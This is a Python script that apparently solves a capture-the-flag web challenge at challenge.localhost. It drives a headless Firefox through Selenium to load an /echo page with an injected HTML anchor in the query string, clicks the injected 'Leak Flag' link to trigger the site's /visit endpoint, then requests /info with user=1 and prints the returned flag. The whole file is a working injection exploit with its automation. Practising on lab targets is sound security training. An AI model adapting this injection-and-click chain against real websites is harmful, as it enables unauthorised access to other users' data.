import urllib.parse
import requests
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
import time

site = "http://challenge.localhost"
url = f"{site}/echo?echo=<a href=/visit?url={site}/leak>Leak Flag</a>"

# Set up Selenium WebDriver for Firefox.
options = FirefoxOptions()                                                                                                
options.add_argument("--headless")                                                                                                                                                                                                                  
service = FirefoxService(log_path="/dev/null")                                                                             
driver = webdriver.Firefox(service=service, options=options) 

try:
    # Visit the URL with the injected payload
    driver.get(url)
    
    # Give it some time to load and render
    time.sleep(2)

    # Find and click the anchor tag
    anchor = driver.find_element(By.LINK_TEXT, "Leak Flag")
    anchor.click()

    time.sleep(2)

    method = "GET"
    params = {"user": 1}
    path = "info"
    port = 80
    url = f"{site}:{port}/{path}"
    response = requests.request(method, url, params = params)

    print(f"Flag: {response.text}")

finally:
    # Close the browser
    driver.quit()



